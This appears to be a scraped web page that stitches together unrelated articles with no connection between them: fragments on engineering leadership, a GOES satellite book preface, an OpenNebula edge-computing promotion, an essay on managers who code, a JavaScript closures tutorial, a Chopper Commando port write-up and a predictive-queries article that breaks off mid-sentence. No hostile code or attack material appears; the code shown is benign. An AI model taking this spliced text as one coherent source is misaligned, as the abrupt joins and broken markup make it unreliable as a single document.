<p>There’s four reasons for this:</p>



<p><strong>Customer alignment:</strong> Product managers are hopefully delivering stories that clearly explain the customer problem and use case. But it’s still easy for devs to get in the weeds. If you constantly remind your team to come back to the problem and user experience, you’ll deliver a higher quality product more often.&nbsp;</p>



<p><strong>Pro tip:</strong> Another question I Iike to ask when a dev is stuck: “Can you describe what your user is going to be doing before, during, and after using this feature?” If they can’t, they need more info.&nbsp;</p>



<p><strong>Pro tip: </strong>Encourage your devs to listen to customer support calls and sales prospects calls. In my experience, lots of teams say they are going to do this then they don’t. At LinearB we have a rule (voted on by the team) that every dev attends two customer calls minimum every month.&nbsp;</p>



<p><strong>Business alignment: </strong>A big part of being a dev leader is <a href="https://linearb.io/blog/being-vp-of-software-development-is-harder-than-being-ceo/" target="_blank" rel="noreferrer noopener">translating executives to engineers</a> and aligning your team’s work to business objectives. I believe there is a business decision behind every line of code. Is the ultimate goal to acquire more customers and generate revenue? Or are we trying to increase customer satisfaction and drive renewals? Are we making a strategic investment in non-functional work to save money and drive higher profit? The more your people understand the big picture impact of what they are working on, the more they’ll be able to think strategically and make better decisions about how to write their code.&nbsp;</p>



<p><strong>Mission and motivation:</strong> Most people want to feel part of something bigger. Sharing the why with your team helps connect them to the rest of the company. Also, regardless of what your company does, you have customers that rely on your product. Real people. Sharing “why” helps …</p></div></div></div>

<p>This book is adaptation of my blog post <a href="http://www.teske.net.br/lucas/2016/10/goes-satellite-hunt-part-1-antenna-system/">GOES Satellite Hunt</a> that was published in the end of 2016 while I was reverse engineering the satellite signal. I’m doing this book to have a more organized document about GOES-13 Signals and also to keep up to date with my GOES-16 Reverse Engineering that followed the GOES-13 Reverse Engineering. This book will also be hosted at GitHub in <a href="https://creativecommons.org/licenses/by-sa/2.5/br/">Create Commons Share Alike</a> license and any fixes are welcome from anyone. In the future I plan to add information about other satellites that use similar down link protocols like MSG-3 (Meteosat 10).</p>

<p>I also need to thank all people in #hearsat @ starchat (IRC) for the help I got understanding SDR and Satellite Signal stuff, since when I started that I had no knowledge at all about it. Special thanks for trango (<a href="https://twitter.com/usa_satcom">@usa-satcom</a>) and mybit (<a href="https://twitter.com/devnulling">@devnulling</a>) for all the help with previous experiences in the area. Also I need to thank all my family for supporting it putting several dishes and antennas all over the roof of our house.</p>

<p>The study in this book lead to the creation of <a href="https://github.com/opensatelliteproject">Open Satellite Project</a>.</p>

</div></div>



<div><div>
<p>The inception of the Internet of Things (IoT) technology has amplified the cloud computing paradigm by establishing the means to be able to distribute computing and processing activities away from the centralized cloud. With the broad explosion of smart devices and their compute processing capabilities, technologies and their supporting organizations are focused on <strong>reducing latency</strong> and providing computing/storing capabilities and analytic applications <strong>as close as possible to the devices</strong>.</p>



<p>This is critical to reducing latency and creating a much more “real-life” response time which is key to so many emerging technologies. Smart devices that are distributed across the globe cannot effectively depend on a <strong>centralized cloud</strong> to perform the cumulative analytical workload at the “speed of thought”.</p>
</div></div>
</div></div></div>



<p>A number of technologies have emerged in the last few year to provide a platform for edge nodes and devices to act on local data and to distribute analytical workloads and compute power across a broadly disseminated infrastructure, even with <strong>intermittent connectivity</strong> to a central cloud. Analytics and machine learning can effectively occur in close proximity to the devices that are generating the raw data, thus distributing workload and vastly reducing latency.</p>



<p>One key factor is that it’s not in the interest of many organizations, nor is it financially feasible for them, to host their own <strong>edge resources across the globe</strong>, with measured geographical distance from deployment areas, so that they can make sure that they are running their IoT solutions as close as possible to end-users.&nbsp;</p>



<p>OpenNebula’s <a href="https://oneedge.io/">ONEedge</a> solution will provide organizations with the necessary tools to create their own <strong>private distributed cloud</strong> in which they can easily deploy and manage edge nodes—on demand, and leased on usage—in geographical locations that are in close proximity to IoT devices and applications. When our client plans an IoT deployment in a new region, they will be able to use OneEdge to determine where they will need edge resources to best service the devices or applications, so that they can allocate on-demand, deploy and control edge nodes <strong>based on the current demand</strong> at those specific geographical locations.<a id="screencast"></a></p>



<p>Now, thanks to our recent integration of AWS’ <a href="https://opennebula.io/firecracker/" target="_blank" rel="noreferrer noopener">Firecracker</a> as a <strong>new virtualization technology</strong> officially supported by OpenNebula, organizations will be able to base the distributed infrastructure they require for their containerized IoT applications on <strong>fast and secure microVMs</strong> that can be quickly deployed on-demand on edge resources from public cloud and bare-metal providers.</p>



<p><a href="https://opennebula.io/firework/" target="_blank" rel="noreferrer noopener">OpenNebula 5.12</a> comes now with seamless integration with the <a href="https://hub.docker.com/" target="_blank" rel="noreferrer noopener">Docker Hub marketplace</a>, which makes it even easier to deploy IoT solutions at the edge using Firecracker microVMs for your <strong>containerized applications</strong>.</p>



<p>Watch the following screencast to learn how you can use OpenNebula to deploy an IoT solution based on <a href="https://thingsboard.io/" target="_blank" rel="noreferrer noopener">ThingsBoard</a>, an <strong>open source IoT platform</strong> for collecting, managing, storing and visualizing data coming from multiple IoT devices. In this use case, edge nodes have been easily provisioned by using <strong>resources from third-party bare-metal providers</strong>, with edge applications being configured and deployed as <strong>containers running within Firecracker microVMs</strong>:</p>

<p>Managers who can’t code are an outdated artifact of corporate America circa 2005. The best managers that I’ve had spend ~80% of their time coding, architecting, or doing technical work that requires engineering prowess. If your manager thinks coding is “beneath” them then they need a dose of humble pie. Your organization would likely be better off without them.</p>



<h2><span id="But_Managers_Manage_People">But Managers Manage <em>People</em>!</span>
</h2>



<p>There is a long-running stigma associated with developers, that we are all geeks who can’t handle interpersonal relationships. Due to our code monkey nature, we need “people people” who can go to meetings for us and communicate our efforts effectively to the higher-ups.</p>



<div><figure><img src="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg" alt="introverted programmers are an outdated meme" srcset="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg 700w, https://qvault.io/wp-content/uploads/2020/07/joke-extrovert-300x184.jpg 300w" sizes="(max-width: 700px) 100vw, 700px" data-srcset="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg 700w, https://qvault.io/wp-content/uploads/2020/07/joke-extrovert-300x184.jpg 300w" data-src="https://qvault.io/wp-content/uploads/2020/07/joke-extrovert.jpg" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure></div>



<p>While the above is still funny, it’s <em>outdated</em>. As the developer community has grown exponentially in the last 20 years, so too has the personality diversity amongst its members. In other words, it is<strong> not hard to find developers with the soft-skills </strong>necessary for management positions.</p>



<h2><span id="Managers_Should_Help">Managers Should Help</span>

<p>I am a firm believer in the following:</p>



<figure><img src="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png" alt="" srcset="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png 1024w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-300x150.png 300w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-768x384.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" data-srcset="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png 1024w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-300x150.png 300w, https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA-768x384.png 768w" data-src="https://qvault.io/wp-content/uploads/2020/07/1_cdTc7T-pGbt5RnX1e9ayoA.png" data-old-src="data:image/gif;base64,R0lGODlhAQABAAAAACH5BAEKAAEALAAAAAABAAEAAAICTAEAOw=="></figure><p>While the manager doesn’t need to be the most talented developer on the team, they must at least be technically literate. When a team member goes to their boss with a technical proposal, the manager should be able to give valuable feedback.</p>



<p>In this <a href="https://hbr.org/2016/12/if-your-boss-could-do-your-job-youre-more-likely-to-be-happy-at-work">study from Harvard</a> 35,000 employees from the US and Great Britain were polled about their job satisfaction, and metrics were gathered about what influenced their happiness at work. The results showed that the <em>single greatest influencing factor </em>on employee satisfaction was whether or not their boss was technically competent. I practice what I preach, so at the <a href="https://classroom.qvault.io/">Qvault app,</a> all engineering leadership will forever be responsible for pushing code.</p>



<p>Contrast the idea of a competent boss with the all-too-familiar experience of going to a <a href="https://qvault.io/2020/05/18/leave-scrum-to-rugby-i-like-getting-stuff-done/">non-technical middle-management type</a> with an engineering problem, only to be stuck in a teaching session because the boss has never heard of a pub-sub system.</p>

</h2>



<p>A good manager has empathy for those who report to them. If the boss doesn’t code or hasn’t written code in a long time, they won’t understand the daily problems that their team is faced with. A good engineering leader will not only understand modern problems, but they make it their role to actively seek technical solutions in an ever-changing innovative landscape.</p>



<h2><span id="INB4_So_the_CEO_needs_to_be_able_to_code">INB4: “So the CEO needs to be able to code?”</span>
</h2>



<p>No, but the CTO does!</p>



<p>I am sympathetic to the idea that the CTO will have plenty of business and product-related work to focus on, but they can’t let their technical chops slip. In order to run the engineering arm of an innovative company, the person at the top should have a firm mental grasp on the implementation difficulties. If this just means reviewing architectural diagrams and reviewing pull-requests so be it, but nothing beats hands-on engineering work to stay sharp.</p>

<br/>
July 14, 2020 | https://whatthefuck.is/closure | <a href="https://web.archive.org/web/*/https://whatthefuck.is/closure">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Closures are confusing because they are an “invisible” concept.</p>
<p>When you use an object, a variable, or a function, you do this intentionally. You think: “I’m gonna need a variable here,” and add it to your code.</p>
<p>Closures are different. By the time most people approach closures, they have already used them unknowingly many times — and it is likely that this is true for yourself, too. So learning closures is less about understanding a <em>new</em> concept and more about recognizing something you have <em>already been doing</em> for a while.</p>
<h3><a href="#tldr" id="tldr">tl;dr</a></h3><p>You have a closure when <strong>a function accesses variables defined outside of it</strong>.</p>
<p>For example, this code snippet contains a closure:</p>
<pre><code><p><span>let</span><span> users </span><span>=</span><span> </span><span>[</span><span>'Alice'</span><span>,</span><span> </span><span>'Dan'</span><span>,</span><span> </span><span>'Jessica'</span><span>]</span><span>;</span><span></span></p><p><span></span><span>let</span><span> query </span><span>=</span><span> </span><span>'A'</span><span>;</span><span></span></p><p><span></span><span>let</span><span> user </span><span>=</span><span> users</span><span>.</span><span>filter</span><span>(</span><span>user</span><span> </span><span>=&gt;</span><span> user</span><span>.</span><span>startsWith</span><span>(</span><span>query</span><span>)</span><span>)</span><span>;</span></p></code></pre><p>Notice how <code>user =&gt; user.startsWith(query)</code> is itself a function. It uses the <code>query</code> variable. But the <code>query</code> variable is defined <em>outside</em> of that function. That’s a closure.</p>
<hr>
<p><strong>You can stop reading here, if you want.</strong> The rest of this article approaches closures in a different way. Instead of explaining what a closure is, it will walk you through the process of <em>discovering</em> closures — like the first programmers did in the 1960s.</p>
<hr>
<h3><a href="#step-1-functions-can-access-outside-variables" id="step-1-functions-can-access-outside-variables">Step 1: Functions Can Access Outside Variables</a></h3><p>To understand closures, we need to be somewhat familiar with variables and functions. In this example, we declare the <code>food</code> variable <em>inside</em> the <code>eat</code> function:</p>
<pre><code><p><span>function</span><span> </span><span>eat</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>let</span><span> food </span><span>=</span><span> </span><span>'cheese'</span><span>;</span><span></span></p><p><span>  </span><span>console</span><span>.</span><span>log</span><span>(</span><span>food </span><span>+</span><span> </span><span>' is good'</span><span>)</span><span>;</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>eat</span><span>(</span><span>)</span><span>;</span><span> </span></p></code></pre><p>But what if we wanted to later change the <code>food</code> variable <em>outside</em> of the <code>eat</code> function? To do this, we can move the <code>food</code> variable itself out of our function into the top level:</p>
<pre><code><p><span>let</span><span> food </span><span>=</span><span> </span><span>'cheese'</span><span>;</span><span> </span><span></span></p><p><span></span><span>function</span><span> </span><span>eat</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>console</span><span>.</span><span>log</span><span>(</span><span>food </span><span>+</span><span> </span><span>' is good'</span><span>)</span><span>;</span><span></span></p><p><span></span><span>}</span></p></code></pre><p>This lets us change the <code>food</code> “from the outside” any time that we want to:</p>
<pre><code><p><span>eat</span><span>(</span><span>)</span><span>;</span><span> </span><span></span></p><p><span>food </span><span>=</span><span> </span><span>'pizza'</span><span>;</span><span></span></p><p><span></span><span>eat</span><span>(</span><span>)</span><span>;</span><span> </span><span></span></p><p><span>food </span><span>=</span><span> </span><span>'sushi'</span><span>;</span><span></span></p><p><span></span><span>eat</span><span>(</span><span>)</span><span>;</span><span> </span></p></code></pre><p>In other words, the <code>food</code> variable is no longer <em>local</em> to our <code>eat</code> function, but our <code>eat</code> function nevertheless has no trouble accessing it. <strong>Functions can access variables outside of them.</strong> Stop for a second and make sure that you have no problem with this idea. Once it has settled comfortably in your brain, move to the second step.</p>
<h3><a href="#step-2-wrapping-code-in-a-function-call" id="step-2-wrapping-code-in-a-function-call">Step 2: Wrapping Code in a Function Call</a></h3><p>Let’s say we have some code:</p>
<pre><code></code></pre><p>It doesn’t matter what that code does. But let’s say that <strong>we want to run it twice</strong>.</p>
<p>One way to do it would be to copy and paste it:</p>
<pre><code></code></pre><p>Another way to do it would be to use a loop:</p>
<pre><code><p><span>for</span><span> </span><span>(</span><span>let</span><span> i </span><span>=</span><span> </span><span>0</span><span>;</span><span> i </span><span>&lt;</span><span> </span><span>2</span><span>;</span><span> i</span><span>++</span><span>)</span><span> </span><span>{</span><span></span></p><p><span></span><span>}</span></p></code></pre><p>The third way, which we’re particularly interested in today, is to wrap it in a function:</p>
<pre><code><p><span>function</span><span> </span><span>doTheThing</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>doTheThing</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span></span><span>doTheThing</span><span>(</span><span>)</span><span>;</span></p></code></pre><p>Using a function gives us the ultimate flexibility because we can run this function any number of times, at any time — and from anywhere in our program.</p>
<p>In fact, <strong>we can even call our new function only <em>once</em></strong>, if we wanted to:</p>
<pre><code><p><span>function</span><span> </span><span>doTheThing</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>doTheThing</span><span>(</span><span>)</span><span>;</span></p></code></pre><p>Notice how the code above is equivalent to the original code snippet:</p>
<pre><code></code></pre><p>In other words, <strong>if we take some piece of code, “wrap” that code in a function, and then call that function exactly once, we haven’t changed what that code is doing</strong>. There are some exceptions to this rule which we will ignore, but generally saying this should make sense. Sit on this idea until your brain feels comfortable with it.</p>
<h3><a href="#step-3-discovering-closures" id="step-3-discovering-closures">Step 3: Discovering Closures</a></h3><p>We have traced our way through two different ideas:</p>
<ul>
<li><strong>Functions can access variables defined outside of them.</strong></li><li><strong>Wrapping code in a function and calling it once doesn’t change the result.</strong></li></ul>
<p>Now let’s see what happens if we combine them.</p>
<p>We’ll take our code example from the first step:</p>
<pre><code><p><span>let</span><span> food </span><span>=</span><span> </span><span>'cheese'</span><span>;</span><span></span></p><p><span></span><span>function</span><span> </span><span>eat</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>console</span><span>.</span><span>log</span><span>(</span><span>food </span><span>+</span><span> </span><span>' is good'</span><span>)</span><span>;</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>eat</span><span>(</span><span>)</span><span>;</span></p></code></pre><p>Then we’ll wrap <em>this whole example</em> into a function, which we’re going to call once:</p>
<pre><code><p><span>function</span><span> </span><span>liveADay</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>let</span><span> food </span><span>=</span><span> </span><span>'cheese'</span><span>;</span><span></span></p><p><span>  </span><span>function</span><span> </span><span>eat</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>console</span><span>.</span><span>log</span><span>(</span><span>food </span><span>+</span><span> </span><span>' is good'</span><span>)</span><span>;</span><span></span></p><p><span>  </span><span>}</span><span></span></p><p><span>  </span><span>eat</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>liveADay</span><span>(</span><span>)</span><span>;</span></p></code></pre><p>Read both snippets one more time and make sure that they are equivalent.</p>
<p>This code works! But look closer. Notice the <code>eat</code> function is <em>inside</em> the <code>liveADay</code> function. Is that even allowed? Can we really put a function inside another function?</p>
<p>There are languages in which a code structured this way is <em>not</em> valid. For example, this code is not valid in the C language (which doesn’t have closures). This means that in C, our second conclusion isn’t true — we can’t just take some arbitrary piece of code and wrap it in a function. But JavaScript doesn’t suffer from that limitation.</p>
<p>Take another good look at this code and notice where <code>food</code> is declared and used:</p>
<pre><code><p><span>function</span><span> </span><span>liveADay</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>let</span><span> food </span><span>=</span><span> </span><span>'cheese'</span><span>;</span><span> </span><span></span></p><p><span>  </span><span>function</span><span> </span><span>eat</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>console</span><span>.</span><span>log</span><span>(</span><span>food </span><span>+</span><span> </span><span>' is good'</span><span>)</span><span>;</span><span> </span><span></span></p><p><span>  </span><span>}</span><span></span></p><p><span>  </span><span>eat</span><span>(</span><span>)</span><span>;</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>liveADay</span><span>(</span><span>)</span><span>;</span></p></code></pre><p>Let’s go through this code together — step by step. First, we declare the <code>liveADay</code> function at the top level. We immediately call it. It has a <code>food</code> local variable. It also contains an <code>eat</code> function. Then it calls that <code>eat</code> function. Because <code>eat</code> is inside of <code>liveADay</code>, it “sees” all of its variables. This is why it can read the <code>food</code> variable.</p>
<p><strong>This is called a closure.</strong></p>
<p><strong>We say that there is a closure when a function (such as <code>eat</code>) reads or writes a variable (such as <code>food</code>) that is declared outside of it (such as in <code>liveADay</code>).</strong></p>
<p>Take some time to re-read this, and make sure you can trace this in the code.</p>
<p>Here is an example we’ve introduced in the tl;dr section:</p>
<pre><code><p><span>let</span><span> users </span><span>=</span><span> </span><span>[</span><span>'Alice'</span><span>,</span><span> </span><span>'Dan'</span><span>,</span><span> </span><span>'Jessica'</span><span>]</span><span>;</span><span></span></p><p><span></span><span>let</span><span> query </span><span>=</span><span> </span><span>'A'</span><span>;</span><span></span></p><p><span></span><span>let</span><span> user </span><span>=</span><span> users</span><span>.</span><span>filter</span><span>(</span><span>user</span><span> </span><span>=&gt;</span><span> user</span><span>.</span><span>startsWith</span><span>(</span><span>query</span><span>)</span><span>)</span><span>;</span></p></code></pre><p>It may be easier to notice the closure if we rewrite it with a function expression:</p>
<pre><code><p><span>let</span><span> users </span><span>=</span><span> </span><span>[</span><span>'Alice'</span><span>,</span><span> </span><span>'Dan'</span><span>,</span><span> </span><span>'Jessica'</span><span>]</span><span>;</span><span></span></p><p><span></span><span>let</span><span> query </span><span>=</span><span> </span><span>'A'</span><span>;</span><span></span></p><p><span></span><span>let</span><span> user </span><span>=</span><span> users</span><span>.</span><span>filter</span><span>(</span><span>function</span><span>(</span><span>user</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>return</span><span> user</span><span>.</span><span>startsWith</span><span>(</span><span>query</span><span>)</span><span>;</span><span></span></p><p><span></span><span>}</span><span>)</span><span>;</span></p></code></pre><p>Whenever a function accesses a variable that is declared outside of it, we say it is a closure. The term itself is used a bit loosely. Some people will refer to the <em>nested function itself</em> as “the closure” in this example. Others might refer to the <em>technique</em> of accessing the outside variables as the closure. Practically, it doesn’t matter.</p>
<h3><a href="#a-ghost-of-a-function-call" id="a-ghost-of-a-function-call">A Ghost of a Function Call</a></h3><p>Closures might seem deceptively simple now. This doesn’t mean they’re without their own pitfalls. The fact that a function may read and write variables outside has rather deep consequences if you really think about it. For example, this means that these variables will “survive” for as long as the nested function may be called:</p>
<pre><code><p><span>function</span><span> </span><span>liveADay</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>  </span><span>let</span><span> food </span><span>=</span><span> </span><span>'cheese'</span><span>;</span><span></span></p><p><span>  </span><span>function</span><span> </span><span>eat</span><span>(</span><span>)</span><span> </span><span>{</span><span></span></p><p><span>    </span><span>console</span><span>.</span><span>log</span><span>(</span><span>food </span><span>+</span><span> </span><span>' is good'</span><span>)</span><span>;</span><span></span></p><p><span>  </span><span>}</span><span></span></p><p><span>  </span><span>setTimeout</span><span>(</span><span>eat</span><span>,</span><span> </span><span>5000</span><span>)</span><span>;</span><span></span></p><p><span></span><span>}</span><span></span></p><p><span></span><span>liveADay</span><span>(</span><span>)</span><span>;</span></p></code></pre><p>Here, <code>food</code> is a local variable inside the <code>liveADay()</code> function call. It’s tempting to think it “disappears” after we exit <code>liveADay</code>, and it won’t come back to haunt us.</p>
<p>However, inside of <code>liveADay</code> we tell the browser to call <code>eat</code> in five seconds. And <code>eat</code> reads the <code>food</code> variable. <strong>So the JavaScript engine needs to keep the <code>food</code> variable from that particular <code>liveADay()</code> call available until <code>eat</code> has been called.</strong></p>
<p>In that sense, we can think of closures as of “ghosts” or “memories” of the past function calls. Even though our <code>liveADay()</code> function call has long finished, its variables must continue to exist for as long as the nested <code>eat</code> function may still be called. Luckily, JavaScript does that for us, so we don’t need to think about it.</p>
<h3><a href="#why-closures" id="why-closures">Why “Closures”?</a></h3><p>Finally, you might be wondering why closures are called that way. The reason is mostly historical. A person familiar with the computer science jargon might say that an expression like <code>user =&gt; user.startsWith(query)</code> has an “open binding”. In other words, it is clear from it what the <code>user</code> is (a parameter), but it is not clear what <code>query</code> is in isolation. When we say “actually, <code>query</code> refers to the variable declared outside”, we are “closing” that open binding. In other words, we get a <em>closure</em>.</p>
<p>Not all languages implement closures. For example, in some languages like C, it is not allowed to nest functions at all. As a result, a function may only access its own local variables or global variables, but there is never a situation in which it can access a parent function’s local variables. Naturally, that limitation is painful.</p>
<p>There are also languages like Rust which implement closures, but have a separate syntax for closures and regular functions. So if you want to read a variable from outside a function, you would have to opt into that in Rust. This is because under the hood, closures may require the engine to keep the outer variables (called “the environment”) around even after the function call. This overhead is acceptable in JavaScript, but it can be a performance concern for the very low-level languages.</p>

<p><i>This article contains pixel art. For best results please use 100% browser zoom.</i></p>

<p><a href="https://github.com/loadzero/chopper258">chopper258</a> is a port of <a href="https://www.mobygames.com/game/chopper-commando">Chopper Commando</a>, a DOS game written by <a href="https://www.mobygames.com/developer/sheet/view/developerId,59219/">Mark Currie</a> using Turbo Pascal in 1990.</p>

<p>Some thirty years later, in 2020, I've dusted off the old code and breathed some new life into it. I've ported it to C and made it work with SDL2, and it can now run natively in modern environments.</p>

<p>The canvas below shows a minute or so of gameplay from the new version.</p>




<p>The game can also be played on the web, thanks to emscripten.</p>

<p>Let's do a quick check to see if you can play.</p>

<span>
    <p>Yes, you can play the game by <span>clicking</span> on the button below.</p>

    
    
</span>

<span>
    <p>Unfortunately, your browser looks to be incompatible. The game currently only works in Desktop Chrome, due to the use of certain low level features.</p>
</span>



<p>Thanks to Mark Currie for granting me permission to publish this translation of his game.

</p><p>In addition to publishing the <a href="https://github.com/loadzero/chopper258">source code</a>, and
<span><a href="https://blog.loadzero.com/demo/chopper258">playable version</a>,</span>
<span>playable version,</span> I am also writing a series of articles to accompany the
project, the first part of which is included below.</p>

<p>I have also made some animations and interactive parts that you can <span>play</span> around
with, such as the <a href="#picker_link">palette picker</a> later on in this piece.</p>



<h2>Background</h2>

<p>I chose to revisit Chopper Commando for a few reasons.

</p><p>One of the biggest ones is nostalgia. I remember enjoying playing this game
as a child, on my PC and with others, and being surprised at some of the novel
mechanics. I also remember having a good laugh.

</p><p>This is the first game I played where you could leave a
vehicle, run around and do things on foot, and then get back in and keep going.
I thought that was so cool, and it was an early precursor to the sandbox games I
enjoy today.

</p><p>I have a soft spot for bedroom coded efforts like this, where the heart and
soul of the game isn't obscured by many layers of polish. It's not too hard to
imagine a 15-year old Mark Currie writing a game for himself on his 286, and
getting a real kick out of doing so.

</p><p>Games like this were pretty formative for me as a young aspiring games
programmer. Unlike something like Super Mario, which seemed unreachable to me at the time, I could play this and start working out how to make something similar, even with the simple tools I had.

</p><h2>Project Scale</h2>

<p>This was a bit smaller and more straightforward than my previous effort,
<a href="http://blog.loadzero.com/blog/si78c/">Space Invaders In C</a>. This project
took around 3 months of calendar time, and about 200 hours were spent on it in total.

</p><p>As the source code to the game was available, albeit in Pascal, not much
reverse engineering was required. Most of the effort went into the translation
to C, and building new code to provide workalikes for the Turbo Pascal API.

</p><p>One of the last parts I worked on, the sound, also turned out to be one of
the most difficult. The original game used PC speaker sound in a dynamic way,
and I had to write a synthesizer for it. It was quite fiddly to get the timing
right and make it sound like the original. More on that in part two.

</p><p>The original code is around 5500 lines of Pascal, all of it game logic code.
The new C version is around 5500 lines of game logic, 1500 lines of support
code and 400 lines of comments.

</p><p>Compared to the last project, there isn't too much behind the scenes
unpublished code in this one. I wrote a few small pieces to aid translation,
some scripts to build the font data, and some prototypes to help figure out the
sound code.

</p><p>I did end up writing a little bit of pascal code, mostly as temporary mods to the
original game source to help me figure out what the original system was doing. More
detail on compiling the old code is provided in a later piece.

</p><h2>Graphics</h2>

<p>One of the very first things I did on the project was to figure out the framebuffer format
for the original game, and start hacking to get it to display on a modern system.

</p><p>The frame buffer is CGA, meaning it is 320 pixels wide, 200 lines high and has
2 bit paletted color, for a grand total of four possible colors on screen at
any one time.

</p><p>Below is a selection of screen shots from the game in all their CGA glory.</p>



<p>If you look carefully, even though each screen can only show four colors, 
you can see that there are more than four colors in total. This is due to
palettes. In the CGA scheme, four base color palettes are available and each has a
different arrangement of sixteen possible colors.

</p><p>As an extra tweak, the first color in the palette (typically the background color), can be
freely chosen out of the sixteen, giving slightly more flexibility. This means that there
are sixteen variations of each of the four base palettes, giving sixty four palettes in total.

<a id="picker_link"></a>

</p><p>To play with the color combinations, <span>click</span> on the colored areas in the first panel below.
You can pick a palette and background color, and the effect will be shown in the second panel,
using one of the screenshots. Use prev and next to cycle to a different screenshot.

</p>


<p>In the old system, the framebuffer and the palette settings are bits of memory
that live on the graphics card and are twiddled by the game directly. In the
new system, these reside in host memory, and must be converted into a modern texture format
on the fly every frame for the GPU to use.

</p><p>Given that there are only 64 possible palettes, a neat trick can be used to
simplify and speed up the framebuffer conversion. Before the game starts
running, every possible combination of palette, background color and input
framebuffer byte (4 pixels at 2bpp) are iterated through, and the resulting 8
output bytes (4 pixels at 16bpp) are stored in a 16 * 4 * 256 entry lookup
table. Converting the framebuffer each frame is then just a matter of iterating
through each byte and performing a simple lookup and memcpy to stamp out four
pixels at a time.

</p><h2>To be continued...</h2>

<p>As mentioned earlier, the sound code was one of the hardest parts of the port. Part two
explains why that was so, and the solution I used to solve it.</p>

<p>The canvas below shows a little preview.</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><blockquote><p>This post appeared first on <a href="https://towardsdatascience.com/predictive-queries-vs-supervised-ml-models-ee7f17e4840e">Towards Data Science</a> in July 12th, 2020.</p></blockquote><p>One of the greatest trends in today’s technology landscape is the <a href="http://knowledge.wharton.upenn.edu/article/democratization-ai-means-tech-innovation/">democratization of machine learning</a>. Because the commodity state-of-the-art models, better tooling and better access to hardware: machine learning is becoming an everyday tool in the companies’ toolbox.</p><p>The ML democratization is still an on-going trend and given the disruption in this space it’s worth asking: where will this transformation take us? What the future of the everyday ML will look like?</p><p>Predictive queries are an interesting take on machine learning, especially in the ML democratization context. Solutions like <a href="http://probcomp.csail.mit.edu/">MIT’s</a> <a href="https://github.com/probcomp/bayeslite">BayesDB/BayesLite</a> and Aito provide a way to get arbitrary predictions instantly with SQL-like queries. As an example, here’s a predictive query in Aito:</p><div data-language="json"><pre><code><span>{</span>
  <span>"from"</span><span>:</span> <span>"invoice_data"</span><span>,</span>
  <span>"where"</span><span>:</span> <span>{</span>
    <span>"Item_Description"</span><span>:</span> <span>"Packaging design"</span><span>,</span>
    <span>"Vendor_Code"</span><span>:</span> <span>"VENDOR-1676"</span>
  <span>}</span><span>,</span>
  <span>"predict"</span><span>:</span> <span>"Product_Category"</span>
<span>}</span></code></pre></div><p>As such: the predictive queries seem like an easier, faster and radically different way to do machine learning. They give a glimpse of a future, where anyone can do machine learning as easily as one does database queries.</p><p>This article gives a brief introduction to the predictive queries, and it compares the predictive queries to supervised learning through 3 different aspects that are:</p><ol><li>The workflow, comparing the easiness and the costs between predictive queries and supervised machine learning</li><li>The architecture, comparing the high level differences between using predictive queries and using supervised models</li><li>And the qualitative properties (scaling, accuracy) as the quality is an obvious concern for an emerging, if promising, technology.</li></ol><h2>Introduction to the predictive queries</h2><p>Predictive queries resemble normal database queries with the exception that they provide predictions about the unknown, while the traditional database queries provide facts about the known. Here’s an example of the BQL (Bayesian Query Language) query done against BayesDB/BayesLite database:</p><div><div><p><img src="https://aitoai-public.s3.eu-central-1.amazonaws.com/website-assets/blog/pq-vs-ml-predictive-queries-in-bayeslite.png" alt=""></p></div><p><span>Predictive BayesQL queries in BayesLite. BayesQL is based on SQL and it provides a very elegant way to query arbitrary estimates. This query can be executed after the CREATE POPULATION, CREATE ANALYSIS, INITIALIZE ANALYSIS and ANALYZE operations. </span></p></div><p>In essence, the predictive queries can provide a very SQL-like alternative to the supervised ML models with the key differences that:</p><ol><li><p>While supervised machine learning models need to be configured, trained and deployed before usage, the predictive queries provide instant answers after the database is prepared with data. As such: the predictive queries have a different workflow.</p></li><li><p>While supervised machine learning is always specialized for a single prediction from A to B, predictive queries can be used a) to instantly predict any unknown X based on any known Y and b) to provide also recommendations, smart search and pattern mining. As such, the supervised models are narrow, while the predictive queries are multipurpose, which has implications on the architecture.</p></li><li><p>While with the supervised machine learning the narrow models are explicitly formed train time, the predictive queries do multi-purpose modeling write time or narrow modeling during query time. As such: the predictive queries are technically more challenging.</p></li></ol><p>Only few 